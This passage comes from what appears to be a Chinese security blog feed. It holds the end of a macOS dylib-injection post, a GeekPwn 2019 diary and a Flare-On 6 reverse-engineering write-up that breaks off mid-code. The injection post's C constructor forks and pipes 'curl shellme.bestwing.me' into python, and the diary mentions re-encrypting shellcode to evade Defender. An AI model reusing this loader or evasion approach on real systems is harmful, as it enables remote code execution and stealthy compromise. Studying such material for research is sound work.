class="title">load</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pid,ppid;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid ==<span class="number">0</span>)&#123;</span><br><span class="line">        ppid = fork();</span><br><span class="line">        <span class="keyword">if</span> (ppid == <span class="number">0</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;touch /tmp/hacker&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;curl shellme.bestwing.me | python &gt; /dev/null &amp;&quot;</span>);</span><br><span class="line"><span class="comment">//        system(&quot;./shell&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))<span class="function"><span class="keyword">int</span> <span class="title">fuck</span><span class="params">()</span></span>&#123;</span><br><span class="line">    load();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==== Hacked by chaitin ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们这里可以选择Xcode 进行编译，选择编译成dylib，或者直接 gcc test.c -shared 编译也可。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191123220244.png"></a></p><p>最后改成相应的名字，放到被注入的程序的对应目录里即可。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> attribute </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 年geekpwn 日记</title>
      <link href="2019-geekpwn-writeup.html"/>
      <url>2019-geekpwn-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h2><p>​    </p><p><em>作为国际化的智能生活安全社区，GeekPwn 是安全极客们施展才华和分享研究成果的舞台。GeekPwn 大赛将在 2019 年 10 月 24 日中国上海举行，力邀才华横溢的极客选手报名，突破安全的边界</em></p><p>今年的geekpwn 有两场，一是7月24日华为专场，针对华为设备进行的破解，二是10月24日上海geekpwn主场，可惜的是今年只有一天。有幸的是，今年我两场都以“长亭科技”安全研究员的身份参与了。</p><h2 id="7月24日-华为专场"><a href="#7月24日-华为专场" class="headerlink" title="7月24日 华为专场"></a>7月24日 华为专场</h2><p>​    由于涉及到漏洞公开原则，漏洞细节在此文中是不会提及的，此文主要写一些这段时间内以来的一些感触，漏洞挖掘经验以及在长亭科技的一些感受。</p><p>​    6月底的时候刚好我毕业答辩，那个时候公司里也刚好差不多结束了“护网”的活动，那段时间，explore、晨升大佬在准备7月24日华为专场geekpwn。</p><p>​    7月初的时候，m4x拉了一个华为IoT的群组</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028215127.png"></a></p><p>​    正式以晨升前期挖掘的一个漏洞进行进一步的利用，后面晨升基本就没来过公司Orz…</p><p>​    整个过程，我们经历了大起大落，每次都觉得要成了，然后就又都沉底了..（Ps： 华为的产品真难打）…我们从一个入口，获取root shell 花了大概两个礼拜的时间。中间利用包括任意命令执行、提权等漏洞差不多有四五个个小的问题组成了一个完整的利用链…整个过程还是比较有意思的..以及能明显感受到 长亭安研的氛围，真的有一种打“CTF”的错觉 233</p><p>当然最后好像完成这个 geekpwn华为专场的一共只有三个队伍，当然包括 “长亭科技”是其中的一个。感谢队友一下不分顺序：晨升、wupco、explore、杰克马、m4x的带飞</p><h2 id="10月24日-上海主场"><a href="#10月24日-上海主场" class="headerlink" title="10月24日 上海主场"></a>10月24日 上海主场</h2><p>​    今年的上海主场的原本是要放弃了，事情发生在 rwctf 之后，由于前期大家都在准备rwctf的题，然后最后由于一些问题，我的题目“咕了”。在此中间经历了 大华摄像头、小米叮叮门铃等等设备，由于rwctf的准备或者Pwn下来实在没有什么意义就中途夭折了（Ps：其实我们在寻求一些不再是 什么路由器、摄像头的IoT设备）。</p><p>​    </p><p>​    然后就在9月12日的时候，杨博提了一句，要不就它了（此处虽然大家都知道，但还是隐名吧，我怕被该公司打，下文均以它指代此设备），还可以做感染其他设备。</p><p>​    于是我们一开始花了1-2个礼拜，陆陆续续挖掘了六七个问题，值得一提的是，该设备犯了一些常见IoT设备都会犯的问题（比如：你自己想吧 你能想到的基本都有，从硬件到软件）。然后中途，由于公司需求，我和m4x去了南京进行拿头代码审计业务。杰克马刚好后面回了公司，所以后面的攻击基本是杰克马和explore完成的。</p><p>​    最后，为了完成一个geekpwn的show的特点，我们又准备了平板电视的攻击，这个也值得调侃的是，一开始只是一个无法直接任意命令执行的安全问题，最后利用了各种安卓的feature完成了命令执行，然而的是，由于我们一开始测试没有升级到最新的版本，最后升级的时候，这个洞被修复了，但可喜的是，升级后送了我们一个能命令执行的漏洞..233。</p><p>​    </p><p><strong>中间的一些小插曲</strong></p><p>1、学习了一些 macos 下的dll注入</p><p>​    利用 insert_dylib 进行macos 下的dylib 注入</p><p>2、学习了一些windows 下defender 的一些绕过的简单思路</p><p>​    对 shellcode 多次加密 绕过defender 静态文件扫描</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还有一些故事有时间再分享，先贴一张最后的大合影：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20191028220803.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> geekpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>The flare-on challenge 6th writeup</title>
      <link href="flare-on-6th-writeup.html"/>
      <url>flare-on-6th-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>这是第三次参加flare on了 这次也是第二次做完全部的题。</p><h2 id="1-Memecat-Battlestation"><a href="#1-Memecat-Battlestation" class="headerlink" title="1 - Memecat Battlestation"></a>1 - Memecat Battlestation</h2><p>C# 题目，一共两关</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104418.png"></a></p><p>stage1Form.WeaponCode 为明文：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104735.png"></a></p><p>Stage2Form.WeaponCode 为异或结果：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819104819.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array = [<span class="number">0x3</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;&amp;&#x27;</span>),ord(<span class="string">&#x27;$&#x27;</span>),ord(<span class="string">&#x27;-&#x27;</span>),<span class="number">0x1e</span>,<span class="number">0x2</span>,ord(<span class="string">&#x27; &#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>),ord(<span class="string">&#x27;.&#x27;</span>),ord(<span class="string">&#x27;/&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(array)):</span><br><span class="line">    s2 += chr(array[i]^ord(<span class="string">&#x27;A&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="2-overlong"><a href="#2-overlong" class="headerlink" title="2 - overlong"></a>2 - overlong</h2><p>一个patch 题目，题目默认输出个</p><p>“I never stop the encoding” </p><p>在栈上将长度改大，然后就get flag</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819113031.png"></a></p><h2 id="3-flarebear"><a href="#3-flarebear" class="headerlink" title="3 - flarebear"></a>3 - flarebear</h2><p>apk 题 使用jeb逆向发现</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130436.png"></a></p><p>当满足 ishappy() 和 isEcstatic() 两个函数的时候，会打印flag。</p><p>ishappy() 逻辑如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131155.png"></a></p><p>isEcstatic() 逻辑如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130705.png"></a></p><p>游戏有三个功能分别为 feed play clean:</p><p>三个功能分别如下：</p><p><strong>feed</strong>：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819130859.png"></a></p><p><strong>play</strong>：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131126.png"></a></p><p><strong>clean</strong>:</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819131025.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">feed = Int(<span class="string">&#x27;feed&#x27;</span>)</span><br><span class="line">play = Int(<span class="string">&#x27;play&#x27;</span>)</span><br><span class="line">clean = Int(<span class="string">&#x27;clean&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solve(feed/play &gt;= <span class="number">2</span>, feed/play&lt;=<span class="number">2.5</span>,feed*<span class="number">10</span>-play*<span class="number">2</span> == <span class="number">72</span>,feed*<span class="number">2</span> + play*<span class="number">4</span> - clean == <span class="number">30</span>,-feed -play + clean*<span class="number">6</span>==<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:/media/psf/Home/Desktop/flare-on/3 - Flarebear $ python solve.py </span><br><span class="line">[Clean = 2, feed = 8, play = 4]</span><br></pre></td></tr></table></figure><p>最后可打印出flag：</p><h2 id="4-Dnschess"><a href="#4-Dnschess" class="headerlink" title="4 - Dnschess"></a>4 - Dnschess</h2><p>题目了三个附件，一个pcap流量包 一个ChessUI 和ChessAI.so 文件。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819143100.png"></a></p><p>通过DNS协议下棋</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163246.png"></a></p><p>首先将满足条件的ip提取出来：    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">iplist = []</span><br><span class="line">cap = FileCapture(input_file=<span class="string">&#x27;capture.pcap&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i,p <span class="keyword">in</span> enumerate(cap):</span><br><span class="line">    <span class="comment"># if p.dns.flags == &#x27;0x00000120&#x27;:</span></span><br><span class="line">    <span class="keyword">if</span> p.dns.flags == <span class="string">&#x27;0x00008580&#x27;</span>:</span><br><span class="line">        name = p.dns.qry_name</span><br><span class="line">        ip = p.dns.a.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(ip)</span></span><br><span class="line">        <span class="keyword">if</span> ip[<span class="number">0</span>] != <span class="number">127</span> <span class="keyword">or</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span> <span class="keyword">and</span> (i/<span class="number">2</span>)&amp;(ip[<span class="number">2</span>])&amp;<span class="number">0xf</span>:</span><br><span class="line">            <span class="comment"># print (map(chr,t2))</span></span><br><span class="line">            ip = <span class="string">&quot;.&quot;</span>.join(ip)</span><br><span class="line">            iplist.append(str(ip))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">print(iplist)</span><br><span class="line">print(len(iplist))</span><br></pre></td></tr></table></figure><p>iplist：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>, <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span class="string">&#x27;127.148.37.223&#x27;</span>, <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br></pre></td></tr></table></figure><p>最后：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819162455.png"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">t3 = [<span class="string">&#x27;127.150.96.223&#x27;</span>, <span class="string">&#x27;127.252.212.90&#x27;</span>, <span class="string">&#x27;127.215.177.38&#x27;</span>, <span class="string">&#x27;127.118.118.207&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;127.89.38.84&#x27;</span>, <span class="string">&#x27;127.109.155.97&#x27;</span>, <span class="string">&#x27;127.217.37.102&#x27;</span>, <span class="string">&#x27;127.49.59.14&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.182.147.24&#x27;</span>, <span class="string">&#x27;127.0.143.11&#x27;</span>, <span class="string">&#x27;127.227.42.139&#x27;</span>, <span class="string">&#x27;127.101.64.243&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.201.85.103&#x27;</span>, <span class="string">&#x27;127.200.76.108&#x27;</span>, <span class="string">&#x27;127.50.67.23&#x27;</span>, <span class="string">&#x27;127.157.96.119&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.99.253.122&#x27;</span>, <span class="string">&#x27;127.25.74.92&#x27;</span>, <span class="string">&#x27;127.168.171.31&#x27;</span>, <span class="string">&#x27;127.148.37.223&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.108.24.10&#x27;</span>, <span class="string">&#x27;127.37.251.13&#x27;</span>, <span class="string">&#x27;127.34.217.88&#x27;</span>, <span class="string">&#x27;127.57.238.51&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.196.103.147&#x27;</span>, <span class="string">&#x27;127.141.14.174&#x27;</span>, <span class="string">&#x27;127.238.7.163&#x27;</span>, <span class="string">&#x27;127.230.231.104&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.55.220.79&#x27;</span>, <span class="string">&#x27;127.184.171.45&#x27;</span>, <span class="string">&#x27;127.196.146.199&#x27;</span>, <span class="string">&#x27;127.191.78.251&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.159.162.42&#x27;</span>, <span class="string">&#x27;127.184.48.79&#x27;</span>, <span class="string">&#x27;127.127.29.123&#x27;</span>, <span class="string">&#x27;127.191.34.35&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;127.5.22.189&#x27;</span>, <span class="string">&#x27;127.233.141.55&#x27;</span>, <span class="string">&#x27;127.55.250.81&#x27;</span>, <span class="string">&#x27;127.53.176.56&#x27;</span>]</span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"></span><br><span class="line">t2 = [<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2d</span>,<span class="number">0x6f</span>,<span class="number">0x6e</span>,<span class="number">0x2e</span>,</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j,p <span class="keyword">in</span> enumerate(t3):    </span><br><span class="line">    ip = map(int,p.split(<span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> ip[<span class="number">0</span>] == <span class="number">127</span> <span class="keyword">and</span> <span class="keyword">not</span> ip[<span class="number">3</span>]&amp;<span class="number">1</span>: </span><br><span class="line">        i = ip[<span class="number">2</span>]&amp;<span class="number">0xf</span></span><br><span class="line">        t2[i*<span class="number">2</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>]</span><br><span class="line">        t2[i*<span class="number">2</span>+<span class="number">1</span>] = ip[<span class="number">1</span>]^t1[i*<span class="number">2</span>+<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print (&#x27;&#x27;.join(map(chr,t2)))</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;&#x27;</span>.join(map(chr,t2)))</span><br></pre></td></tr></table></figure><h2 id="5-demo"><a href="#5-demo" class="headerlink" title="5 - demo"></a>5 - demo</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819224302.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190822163335.png"></a></p><p>这个函数将修改视角</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190819234706.png"></a></p><h2 id="6-bmphide"><a href="#6-bmphide" class="headerlink" title="6 - bmphide"></a>6 - bmphide</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820155759.png"></a></p><p>参数的0 1 2  位分别是 原图、 待隐写数据 和保存的图片。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20190820170000.png"></a></p><p>函数i 可知是一个类似于LSB 隐写的代码，将加密后的数据隐写到</p><p>R G B  对应为 低0 1 2 ； 0 1 2 ; 0 1处</p><p>j 函数大致逻辑录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">j(z)  (ww*yy+zz+4+f(6))^b(z,1) </span><br><span class="line">ww = 0x1F7D1482</span><br><span class="line">yy = 20*136+18</span><br><span class="line">zz = MzQxOTk=  34199</span><br><span class="line">j(103) = 0  </span><br><span class="line">j(231) = 1 </span><br><span class="line">j(230) = 3 </span><br><span class="line">j(27) = 0xf8 </span><br><span class="line">j(228) = 7 </span><br><span class="line">j(25) = 0xfc</span><br><span class="line">j(100) = 6</span><br></pre></td></tr></table></figure><p>利用如下代码提取数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;flag.bmp&#x27;</span>)</span><br><span class="line"><span class="comment"># img2 = Image.open(&#x27;new1.jpg&#x27;)</span></span><br><span class="line">pixel = img.load()</span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(img.size[<span class="number">0</span>]):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(img.size[<span class="number">1</span>]):</span><br><span class="line">p = pixel[x, y]</span><br><span class="line">        <span class="comment"># print(p)</span></span><br><span class="line">data = (p[<span class="number">0</span>]&amp;<span class="number">7</span>) | ((p[<span class="number">1</span>]&amp;<span class="number">7</span>)&lt;&lt;<span class="number">3</span>) | ((p[<span class="number">2</span>]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">6</span>)</span><br><span class="line">d.append(data)</span><br><span class="line"></span><br><span class="line">extract_file = <span class="string">&quot;&quot;</span>.join(map(chr,d))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;extract_file&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(extract_file)</span><br></pre></td></tr></table></figure><p>通过分析代码逻辑发现其中h的逻辑大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># c((a((data[i] ^ f(num++)) , 7))) ^ f(num++),3)</span></span><br><span class="line"><span class="meta"># f =&gt; g  a =&gt; b  c =&gt; d</span></span><br></pre></td></tr></table></figure><p>但其中几个函数被替换，f 替换为 g, a替换为b, c替换为d</p><p>最后代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 